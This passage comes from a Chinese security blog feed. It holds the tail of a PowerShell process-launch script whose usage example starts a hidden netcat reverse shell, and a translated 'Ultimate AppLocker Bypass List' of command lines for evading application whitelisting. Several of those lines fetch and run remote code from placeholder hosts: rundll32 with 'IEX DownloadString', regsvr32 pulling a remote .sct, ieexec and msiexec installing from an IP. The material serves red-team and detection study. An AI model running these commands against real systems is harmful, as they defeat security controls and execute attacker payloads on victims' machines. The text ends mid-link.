(CREATE_NO_WINDOW)</span><br><span class="line">                        </span><br><span class="line">     -ShowWindow        Window <span class="attribute">display</span> flags:</span><br><span class="line">                          <span class="number">0</span>x0000 (SW_HIDE)</span><br><span class="line">                          <span class="number">0</span>x0001 (SW_SHOWNORMAL)</span><br><span class="line">                          <span class="number">0</span>x0001 (SW_NORMAL)</span><br><span class="line">                          <span class="number">0</span>x0002 (SW_SHOWMINIMIZED)</span><br><span class="line">                          <span class="number">0</span>x0003 (SW_SHOWMAXIMIZED)</span><br><span class="line">                          <span class="number">0</span>x0003 (SW_MAXIMIZE)</span><br><span class="line">                          <span class="number">0</span>x0004 (SW_SHOWNOACTIVATE)</span><br><span class="line">                          <span class="number">0</span>x0005 (SW_SHOW)</span><br><span class="line">                          <span class="number">0</span>x0006 (SW_MINIMIZE)</span><br><span class="line">                          <span class="number">0</span>x0007 (SW_SHOWMINNOACTIVE)</span><br><span class="line">                          <span class="number">0</span>x0008 (SW_SHOWNA)</span><br><span class="line">                          <span class="number">0</span>x0009 (SW_RESTORE)</span><br><span class="line">                          <span class="number">0</span>x000A (SW_SHOWDEFAULT)</span><br><span class="line">                          <span class="number">0</span>x000B (SW_FORCEMINIMIZE)</span><br><span class="line">                          <span class="number">0</span>x000B (SW_MAX)</span><br><span class="line">              </span><br><span class="line">     -StartF            Bitfield to influence window creation:</span><br><span class="line">                          <span class="number">0</span>x00000001 (STARTF_USESHOWWINDOW)</span><br><span class="line">                          <span class="number">0</span>x00000002 (STARTF_USESIZE)</span><br><span class="line">                          <span class="number">0</span>x00000004 (STARTF_USEPOSITION)</span><br><span class="line">                          <span class="number">0</span>x00000008 (STARTF_USECOUNTCHARS)</span><br><span class="line">                          <span class="number">0</span>x00000010 (STARTF_USEFILLATTRIBUTE)</span><br><span class="line">                          <span class="number">0</span>x00000020 (STARTF_RUNFULLSCREEN)</span><br><span class="line">                          <span class="number">0</span>x00000040 (STARTF_FORCEONFEEDBACK)</span><br><span class="line">                          <span class="number">0</span>x00000080 (STARTF_FORCEOFFFEEDBACK)</span><br><span class="line">                          <span class="number">0</span>x00000100 (STARTF_USESTDHANDLES)</span><br><span class="line">.DESCRIPTION</span><br><span class="line">  Author: Ruben Boonen (@FuzzySec)</span><br><span class="line">  License: BSD <span class="number">3</span>-Clause</span><br><span class="line">  Required Dependencies: None</span><br><span class="line">  Optional Dependencies: None</span><br><span class="line">.EXAMPLE</span><br><span class="line">  Start calc with NONE/SW_SHOWNORMAL/STARTF_USESHOWWINDOW</span><br><span class="line">  C:\PS&gt; Invoke-CreateProcess -Binary C:\Windows\System32\calc<span class="selector-class">.exe</span> -CreationFlags <span class="number">0</span>x0 -ShowWindow <span class="number">0</span>x1 -StartF <span class="number">0</span>x1</span><br><span class="line">  </span><br><span class="line">.EXAMPLE</span><br><span class="line">  Start nc reverse shell with CREATE_NO_WINDOW/SW_HIDE/STARTF_USESHOWWINDOW</span><br><span class="line">  C:\PS&gt; Invoke-CreateProcess -Binary C:\Some\Path\nc<span class="selector-class">.exe</span> -Args <span class="string">"-nv 127.0.0.1 9988 -e C:\Windows\System32\cmd.exe"</span> -CreationFlags <span class="number">0</span>x8000000 -ShowWindow <span class="number">0</span>x0 -StartF <span class="number">0</span>x1</span><br><span class="line">#&gt;</span><br><span class="line">  param (</span><br><span class="line">        [Parameter(Mandatory = <span class="variable">$True</span>)]</span><br><span class="line">    [string]<span class="variable">$Binary</span>,</span><br><span class="line">        [Parameter(Mandatory = <span class="variable">$False</span>)]</span><br><span class="line">    [string]<span class="variable">$Args</span>=<span class="variable">$null</span>,</span><br><span class="line">        [Parameter(Mandatory = <span class="variable">$True</span>)]</span><br><span class="line">    [Int]<span class="variable">$CreationFlags</span>,</span><br><span class="line">        [Parameter(Mandatory = <span class="variable">$True</span>)]</span><br><span class="line">    [Int]<span class="variable">$ShowWindow</span>,</span><br><span class="line">        [Parameter(Mandatory = <span class="variable">$True</span>)]</span><br><span class="line">    [Int]<span class="variable">$StartF</span></span><br><span class="line">  )  </span><br><span class="line">    # Define all the structures for CreateProcess</span><br><span class="line">  Add-Type -TypeDefinition @<span class="string">"</span></span><br><span class="line"><span class="string">  using System;</span></span><br><span class="line"><span class="string">  using System.Diagnostics;</span></span><br><span class="line"><span class="string">  using System.Runtime.InteropServices;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  [StructLayout(LayoutKind.Sequential)]</span></span><br><span class="line"><span class="string">  public struct PROCESS_INFORMATION</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    public IntPtr hProcess;</span></span><br><span class="line"><span class="string">        public IntPtr hThread;</span></span><br><span class="line"><span class="string">        public uint dwProcessId;</span></span><br><span class="line"><span class="string">        public uint dwThreadId;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]</span></span><br><span class="line"><span class="string">  public struct STARTUPINFO</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    public uint cb;</span></span><br><span class="line"><span class="string">        public string lpReserved;</span></span><br><span class="line"><span class="string">        public string lpDesktop;</span></span><br><span class="line"><span class="string">        public string lpTitle;</span></span><br><span class="line"><span class="string">    public uint dwX;</span></span><br><span class="line"><span class="string">        public uint dwY;</span></span><br><span class="line"><span class="string">        public uint dwXSize;</span></span><br><span class="line"><span class="string">        public uint dwYSize;</span></span><br><span class="line"><span class="string">        public uint dwXCountChars;</span></span><br><span class="line"><span class="string">    public uint dwYCountChars;</span></span><br><span class="line"><span class="string">        public uint dwFillAttribute;</span></span><br><span class="line"><span class="string">        public uint dwFlags;</span></span><br><span class="line"><span class="string">        public short wShowWindow;</span></span><br><span class="line"><span class="string">    public short cbReserved2;</span></span><br><span class="line"><span class="string">        public IntPtr lpReserved2;</span></span><br><span class="line"><span class="string">        public IntPtr hStdInput;</span></span><br><span class="line"><span class="string">        public IntPtr hStdOutput;</span></span><br><span class="line"><span class="string">    public IntPtr hStdError;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  [StructLayout(LayoutKind.Sequential)]</span></span><br><span class="line"><span class="string">  public struct SECURITY_ATTRIBUTES</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    public int length;</span></span><br><span class="line"><span class="string">        public IntPtr lpSecurityDescriptor;</span></span><br><span class="line"><span class="string">        public bool bInheritHandle;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  public static class Kernel32</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    [DllImport("</span>kernel32.dll<span class="string">", SetLastError=true)]</span></span><br><span class="line"><span class="string">    public static extern bool CreateProcess(</span></span><br><span class="line"><span class="string">      string lpApplicationName,</span></span><br><span class="line"><span class="string">            string lpCommandLine,</span></span><br><span class="line"><span class="string">            ref SECURITY_ATTRIBUTES lpProcessAttributes, </span></span><br><span class="line"><span class="string">      ref SECURITY_ATTRIBUTES lpThreadAttributes,</span></span><br><span class="line"><span class="string">            bool bInheritHandles,</span></span><br><span class="line"><span class="string">            uint dwCreationFlags, </span></span><br><span class="line"><span class="string">      IntPtr lpEnvironment,</span></span><br><span class="line"><span class="string">            string lpCurrentDirectory,</span></span><br><span class="line"><span class="string">            ref STARTUPINFO lpStartupInfo, </span></span><br><span class="line"><span class="string">      out PROCESS_INFORMATION lpProcessInformation);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">"</span>@</span><br><span class="line">  </span><br><span class="line">  # StartupInfo Struct</span><br><span class="line">  <span class="variable">$StartupInfo</span> = New-Object STARTUPINFO</span><br><span class="line">  $StartupInfo.dwFlags = $StartF # StartupInfo.dwFlag</span><br><span class="line">  $StartupInfo.wShowWindow = $ShowWindow # StartupInfo.ShowWindow</span><br><span class="line">  $StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfo) # Struct Size</span><br><span class="line">  </span><br><span class="line">  # ProcessInfo Struct</span><br><span class="line">  <span class="variable">$ProcessInfo</span> = New-Object PROCESS_INFORMATION</span><br><span class="line">  </span><br><span class="line">  # SECURITY_ATTRIBUTES Struct (Process &amp; Thread)</span><br><span class="line">  <span class="variable">$SecAttr</span> = New-Object SECURITY_ATTRIBUTES</span><br><span class="line">  <span class="variable">$SecAttr</span><span class="selector-class">.Length</span> = [System<span class="selector-class">.Runtime</span><span class="selector-class">.InteropServices</span><span class="selector-class">.Marshal</span>]::SizeOf(<span class="variable">$SecAttr</span>)</span><br><span class="line">  </span><br><span class="line">  # CreateProcess --&gt; lpCurrentDirectory</span><br><span class="line">  <span class="variable">$GetCurrentPath</span> = (Get-Item -Path <span class="string">".\" -Verbose).FullName</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  # Call CreateProcess</span></span><br><span class="line"><span class="string">  [Kernel32]::CreateProcess($Binary, $Args, [ref] $SecAttr, [ref] $SecAttr, $false, $CreationFlags, [IntPtr]::Zero, $GetCurrentPath, [ref] $StartupInfo, [ref] $ProcessInfo) |out-null</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  echo "</span>`nProcess Information:<span class="string">"</span></span><br><span class="line"><span class="string">  Get-Process -Id $ProcessInfo.dwProcessId |ft</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="如图所示"><a href="#如图所示" class="headerlink" title="如图所示"></a>如图所示</h3><p><img src="http://ojg8j426f.bkt.clouddn.com/9A727799-C49D-4D1E-B2E1-B44668E431E6.jpg" alt="enter description here"></p><p>技术博客推荐：</p><p>1.Google的Project Zero团队博客</p><p><a href="https://googleprojectzero.blogspot.co.uk/" target="_blank" rel="noopener">https://googleprojectzero.blogspot.co.uk/</a></p><p>2.NetSPI博客</p><p><a href="https://blog.netspi.com/" target="_blank" rel="noopener">https://blog.netspi.com/</a></p><p>3.html5安全备忘录</p><p><a href="https://html5sec.org/" target="_blank" rel="noopener">https://html5sec.org/</a></p><p>4.寻找内存中的.NET攻击</p><p><a href="https://www.endgame.com/blog/technical-blog/hunting-memory-net-attacks" target="_blank" rel="noopener">https://www.endgame.com/blog/technical-blog/hunting-memory-net-attacks</a></p><p>5.klion’s blog</p><p><a href="https://klionsec.github.io/" target="_blank" rel="noopener">https://klionsec.github.io/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ojg8j426f.bkt.clouddn.com/850.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="每日安全干货及动态" scheme="www.ggsec.cn/categories/%E6%AF%8F%E6%97%A5%E5%AE%89%E5%85%A8%E5%B9%B2%E8%B4%A7%E5%8F%8A%E5%8A%A8%E6%80%81/"/>
    
    
      <category term="每日安全干货及动态" scheme="www.ggsec.cn/tags/%E6%AF%8F%E6%97%A5%E5%AE%89%E5%85%A8%E5%B9%B2%E8%B4%A7%E5%8F%8A%E5%8A%A8%E6%80%81/"/>
    
  </entry>
  
  <entry>
    <title>Ultimate AppLocker ByPass List</title>
    <link href="www.ggsec.cn/UltimateAppLockerByPassList.html"/>
    <id>www.ggsec.cn/UltimateAppLockerByPassList.html</id>
    <published>2018-01-04T14:13:19.000Z</published>
    <updated>2018-01-04T14:49:28.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/maxresdfault.jpg" alt="enter description here"><br><a id="more"></a><br>GIthub ：<a href="https://github.com/api0cradle/UltimateAppLockerByPassList" target="_blank" rel="noopener">https://github.com/api0cradle/UltimateAppLockerByPassList</a><br>此存储库的目标是记录最常用的技术来绕过AppLocker。本自述文件包含所有已知绕过路径的完整列表。由于AppLocker可以以不同的方式进行配置，所以有一个绕过主列表是有意义的。这README.MD将是主，并将更新已知和可能的AppLocker绕过。</p><p>我已经创建了一个验证Bypass列表，再次使用AppLocker创建的默认规则。</p><p>有关我如何验证的详细信息，可以查看他的博客：<a href="https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/" target="_blank" rel="noopener">https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/</a></p><p>VerifiedBypasses-DefaultRules.MD</p><p>如果您想知道如何创建默认规则，您可以按照以下指南进行操作：https： //www.rootusers.com/implement-applocker-rules/</p><p>请贡献并指出我忘记的错误或资源。请记住，必须验证BypassDLL和BypassEXE的旁路技术。BypassDLL-DefaultRules和BypassEXE-DefaultRules列表应该只包含有效的绕过。</p><h2 id="Rundll32-exe"><a href="#Rundll32-exe" class="headerlink" title="Rundll32.exe"></a>Rundll32.exe</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();new%20A</span><br><span class="line"><span class="function"><span class="title">ctiveXObject</span><span class="params">(<span class="string">"WScript.Shell"</span>)</span></span>.Run(<span class="string">"powershell -nop -exec bypass -c IEX (New-Object</span></span><br><span class="line"><span class="string">Net.WebClient).DownloadString('http://ip:port/');"</span></span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXO</span><br><span class="line">bject(\"WScript.Shell\");w.run(\"calc\");window.close()");`</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">`rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20A</span><br><span class="line">ctiveXObject("WScript.Shell").run("calc.exe",0,true);try&#123;h.Send();b=h.ResponseT</span><br><span class="line">ext;eval(b;&#125;catch(e)&#123;new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill </span><br><span class="line">/f /im rundll32.exe<span class="string">",0,true);&#125;`</span></span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">`rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetOb</span><br><span class="line">ject(<span class="string">"script:https://raw.githubusercontent.com/3gstudent/</span></span><br><span class="line"><span class="string">Javascript-Backdoor/master/test"</span>)`</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`rundll32 shell32<span class="selector-class">.dll</span>,Control_RunDLL payload.dll`</span><br></pre></td></tr></table></figure><p>Requires admin: No</p><p>Notes:</p><p>Links:<br><a href="https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/" target="_blank" rel="noopener">https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/</a><br><a href="https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_7" target="_blank" rel="noopener">https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_7</a><br><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Rundll32.md" target="_blank" rel="noopener">https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Rundll32.md</a></p><h2 id="Regsvr32-exe"><a href="#Regsvr32-exe" class="headerlink" title="Regsvr32.exe"></a>Regsvr32.exe</h2><p>regsvr32 /s /n /u /i:<a href="http://example.com/file.sct" target="_blank" rel="noopener">http://example.com/file.sct</a> scrobj.dll`</p><p>Requires admin: No</p><p>Notes:</p><p>Links:<br><a href="https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302" target="_blank" rel="noopener">https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302</a><br><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Regsvr32.md" target="_blank" rel="noopener">https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Regsvr32.md</a></p><h2 id="Msbuild-exe"><a href="#Msbuild-exe" class="headerlink" title="Msbuild.exe"></a>Msbuild.exe</h2><p><code>msbuild.exe pshell.xml</code></p><p>Requires admin: No</p><p>Notes:</p><p>Links:<br><a href="https://gist.github.com/subTee/6b236083da2fd6ddff216e434f257614" target="_blank" rel="noopener">https://gist.github.com/subTee/6b236083da2fd6ddff216e434f257614</a><br><a href="http://subt0x10.blogspot.no/2017/04/bypassing-application-whitelisting.html" target="_blank" rel="noopener">http://subt0x10.blogspot.no/2017/04/bypassing-application-whitelisting.html</a><br><a href="https://github.com/Cn33liz/MSBuildShell" target="_blank" rel="noopener">https://github.com/Cn33liz/MSBuildShell</a><br><a href="https://github.com/Cn33liz/MS17-012" target="_blank" rel="noopener">https://github.com/Cn33liz/MS17-012</a><br><a href="https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/" target="_blank" rel="noopener">https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/</a><br><a href="https://www.youtube.com/watch?v=aSDEAPXaz28" target="_blank" rel="noopener">https://www.youtube.com/watch?v=aSDEAPXaz28</a><br><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Trusted_Developer_Utilities.md" target="_blank" rel="noopener">https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Trusted_Developer_Utilities.md</a></p><h2 id="Regsvcs-exe"><a href="#Regsvcs-exe" class="headerlink" title="Regsvcs.exe"></a>Regsvcs.exe</h2><p><code>regsvcs.exe /U regsvcs.dll</code><br><code>regsvcs.exe regsvcs.dll</code></p><p>Requires admin: ?</p><p>Notes:</p><p>Links:<br><a href="https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/" target="_blank" rel="noopener">https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/</a><br><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/RegSvcsRegAsmBypass.cs" target="_blank" rel="noopener">https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/RegSvcsRegAsmBypass.cs</a><br><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/RegsvcsRegasm.md" target="_blank" rel="noopener">https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/RegsvcsRegasm.md</a></p><h2 id="Regasm-exe"><a href="#Regasm-exe" class="headerlink" title="Regasm.exe"></a>Regasm.exe</h2><p><code>regasm.exe /U regsvcs.dll</code><br><code>regasm.exe regsvcs.dll</code></p><p>Requires admin: ?</p><p>Notes:</p><p>Links:<br><a href="https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/" target="_blank" rel="noopener">https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/</a><br><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/RegSvcsRegAsmBypass.cs" target="_blank" rel="noopener">https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/RegSvcsRegAsmBypass.cs</a><br><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/RegsvcsRegasm.md" target="_blank" rel="noopener">https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/RegsvcsRegasm.md</a></p><h2 id="Bginfo-exe"><a href="#Bginfo-exe" class="headerlink" title="Bginfo.exe"></a>Bginfo.exe</h2><p><code>bginfo.exe bginfo.bgi /popup /nolicprompt</code></p><p>Requires admin: No</p><p>Notes:</p><p>Links:<br><a href="https://msitpros.com/?p=3831" target="_blank" rel="noopener">https://msitpros.com/?p=3831</a><br><a href="https://pentestlab.blog/2017/06/05/applocker-bypass-bginfo/" target="_blank" rel="noopener">https://pentestlab.blog/2017/06/05/applocker-bypass-bginfo/</a><br><a href="https://msitpros.com/?p=3860" target="_blank" rel="noopener">https://msitpros.com/?p=3860</a></p><h2 id="InstallUtil-exe"><a href="#InstallUtil-exe" class="headerlink" title="InstallUtil.exe"></a>InstallUtil.exe</h2><p><code>InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll</code></p><p>Requires admin: No</p><p>Notes:</p><p>Links:<br><a href="https://github.com/subTee/AllTheThings" target="_blank" rel="noopener">https://github.com/subTee/AllTheThings</a><br><a href="https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/" target="_blank" rel="noopener">https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/</a><br><a href="https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_12" target="_blank" rel="noopener">https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_12</a><br><a href="http://subt0x10.blogspot.no/2017/09/banned-file-execution-via.html" target="_blank" rel="noopener">http://subt0x10.blogspot.no/2017/09/banned-file-execution-via.html</a><br><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/InstallUtil.md" target="_blank" rel="noopener">https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/InstallUtil.md</a></p><h2 id="MSDT-exe"><a href="#MSDT-exe" class="headerlink" title="MSDT.exe"></a>MSDT.exe</h2><p><code>Open .diagcab package</code></p><p>Requires admin: ?</p><p>Notes:</p><p>Links:<br><a href="https://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/" target="_blank" rel="noopener">https://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/</a></p><h2 id="mshta-exe"><a href="#mshta-exe" class="headerlink" title="mshta.exe"></a>mshta.exe</h2><p><code>mshta.exe evilfile.hta</code></p><p>Requires admin: No</p><p>Notes:</p><p>Links:<br><a href="https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4" target="_blank" rel="noopener">https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4</a></p><h2 id="Execute-Bat"><a href="#Execute-Bat" class="headerlink" title="Execute .Bat"></a>Execute .Bat</h2><p><code>cmd.exe /k &lt; script.txt</code></p><p>Requires admin: No</p><p>Notes:</p><p>Links:<br><a href="https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3" target="_blank" rel="noopener">https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3</a></p><h2 id="Execute-PS1"><a href="#Execute-PS1" class="headerlink" title="Execute .PS1"></a>Execute .PS1</h2><p><code>Get-Content script.txt | iex</code></p><p>Requires admin: No</p><p>Notes:</p><p>Links:<br><a href="https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3" target="_blank" rel="noopener">https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3</a></p><h2 id="Execute-VBS"><a href="#Execute-VBS" class="headerlink" title="Execute .VBS"></a>Execute .VBS</h2><p><code>cscript.exe //E:vbscript script.txt</code></p><p>Requires admin: No</p><p>Notes:</p><p>Links:<br><a href="https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3" target="_blank" rel="noopener">https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3</a></p><h2 id="PresentationHost-exe"><a href="#PresentationHost-exe" class="headerlink" title="PresentationHost.exe"></a>PresentationHost.exe</h2><p>Missing Example</p><p>Requires admin: ?</p><p>Notes:</p><p>Links:<br><a href="https://raw.githubusercontent.com/subTee/ShmooCon-2015/master/ShmooCon-2015-Simple-WLEvasion.pdf" target="_blank" rel="noopener">https://raw.githubusercontent.com/subTee/ShmooCon-2015/master/ShmooCon-2015-Simple-WLEvasion.pdf</a></p><h2 id="dfsvc-exe"><a href="#dfsvc-exe" class="headerlink" title="dfsvc.exe"></a>dfsvc.exe</h2><p>Missing Example</p><p>Requires admin: ?</p><p>Notes:</p><p>Links:<br><a href="https://raw.githubusercontent.com/subTee/ShmooCon-2015/master/ShmooCon-2015-Simple-WLEvasion.pdf" target="_blank" rel="noopener">https://raw.githubusercontent.com/subTee/ShmooCon-2015/master/ShmooCon-2015-Simple-WLEvasion.pdf</a></p><h2 id="IEExec-exe"><a href="#IEExec-exe" class="headerlink" title="IEExec.exe"></a>IEExec.exe</h2><p><code>ieexec.exe http://x.x.x.x:8080/bypass.exe</code></p><p>Requires admin: ?</p><p>Notes:</p><p>Links:<br><a href="https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/" target="_blank" rel="noopener">https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/</a></p><h2 id="cdb-exe"><a href="#cdb-exe" class="headerlink" title="cdb.exe"></a>cdb.exe</h2><p><code>cdb.exe -cf x64_calc.wds -o notepad.exe</code></p><p>Requires admin: ?</p><p>Notes:</p><p>Links:<br><a href="http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html" target="_blank" rel="noopener">http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html</a></p><h2 id="dnx-exe"><a href="#dnx-exe" class="headerlink" title="dnx.exe"></a>dnx.exe</h2><p><code>dnx.exe consoleapp</code></p><p>Requires admin: ?</p><p>Notes:</p><p>Links:<br><a href="https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/" target="_blank" rel="noopener">https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/</a></p><h2 id="rcsi-exe"><a href="#rcsi-exe" class="headerlink" title="rcsi.exe"></a>rcsi.exe</h2><p><code>rcsi.exe bypass.csx</code></p><p>Requires admin: ?</p><p>Notes:</p><p>Links:<br><a href="https://enigma0x3.net/2016/11/21/bypassing-application-whitelisting-by-using-rcsi-exe/" target="_blank" rel="noopener">https://enigma0x3.net/2016/11/21/bypassing-application-whitelisting-by-using-rcsi-exe/</a></p><h2 id="csi-exe"><a href="#csi-exe" class="headerlink" title="csi.exe"></a>csi.exe</h2><p>Missing example</p><p>Requires admin: ?</p><p>Notes:</p><p>Links:<br><a href="https://web.archive.org/web/20161008143428/http://subt0x10.blogspot.com/2016/09/application-whitelisting-bypass-csiexe.html" target="_blank" rel="noopener">https://web.archive.org/web/20161008143428/http://subt0x10.blogspot.com/2016/09/application-whitelisting-bypass-csiexe.html</a></p><h2 id="CPL-loading-location-manipulation"><a href="#CPL-loading-location-manipulation" class="headerlink" title="CPL loading location manipulation"></a>CPL loading location manipulation</h2><p><code>Control.exe</code></p><p>Requires admin: No</p><p>Notes:</p><p>Links:<br><a href="https://pentestlab.blog/2017/05/24/applocker-bypass-control-panel/" target="_blank" rel="noopener">https://pentestlab.blog/2017/05/24/applocker-bypass-control-panel/</a><br><a href="https://www.contextis.com/resources/blog/applocker-bypass-registry-key-manipulation/" target="_blank" rel="noopener">https://www.contextis.com/resources/blog/applocker-bypass-registry-key-manipulation/</a></p><h2 id="msxsl-exe"><a href="#msxsl-exe" class="headerlink" title="msxsl.exe"></a>msxsl.exe</h2><p><code>msxsl.exe customers.xml script.xsl</code></p><p>Requires admin: No</p><p>Notes:</p><p>Links:<br><a href="https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/" target="_blank" rel="noopener">https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/</a><br><a href="https://gist.github.com/subTee/d9380299ff35738723cb44f230ab39a1" target="_blank" rel="noopener">https://gist.github.com/subTee/d9380299ff35738723cb44f230ab39a1</a></p><h2 id="msiexec-exe"><a href="#msiexec-exe" class="headerlink" title="msiexec.exe"></a>msiexec.exe</h2><p><code>msiexec /quiet /i cmd.msi</code><br><code>msiexec /q /i http://192.168.100.3/tmp/cmd.png</code></p><p>Requires admin: ?</p><p>Notes:</p><p>Links:<br><a href="https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/" target="_blank" rel="noopener">https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/</a></p><h2 id="cmstp-exe"><a href="#cmstp-exe" class="headerlink" title="cmstp.exe"></a>cmstp.exe</h2><p><code>cmstp.exe /ni /s c:\cmstp\CorpVPN.inf</code></p><p>Requires admin: No</p><p>Notes:</p><p>Links:<br><a href="https://msitpros.com/?p=3960" target="_blank" rel="noopener">https://msitpros.com/?p=3960</a><br><a href="https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e" target="_blank" rel="noopener">https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e</a></p><h2 id="xwizard-exe"><a href="#xwizard-exe" class="headerlink" title="xwizard.exe"></a>xwizard.exe</h2><p><code>xwizard.exe argument1 argument2</code><br>DLL loading in same folder xwizard.dll</p><p>Requires admin: No</p><p>Notes:</p><p>Links:<br><a href="http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/" target="_blank" rel="noopener">http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/</a></p><h2 id="fsi-exe"><a href="#fsi-exe" class="headerlink" title="fsi.exe"></a>fsi.exe</h2><p><code>fsi.exe c:\folder\d.fscript</code></p><p>Requires admin: No</p><p>Notes:</p><p>Links:<br><a href="https://gist.github.com/NickTyrer/51eb8c774a909634fa69b4d06fc79ae1" target="_blank" rel="noopener">https://gist.github.com/NickTyrer/51eb8c774a909634fa69b4d06fc79ae1</a><br><a href="https://twitter.com/NickTyrer/status/904273264385589248" target="_blank" rel="noopener">https://twitter.com/NickTyrer/status/904273264385589248</a><br><a href="https://docs.microsoft.com/en-us/dotnet/fsharp/tutorials/fsharp-interactive/" target="_blank" 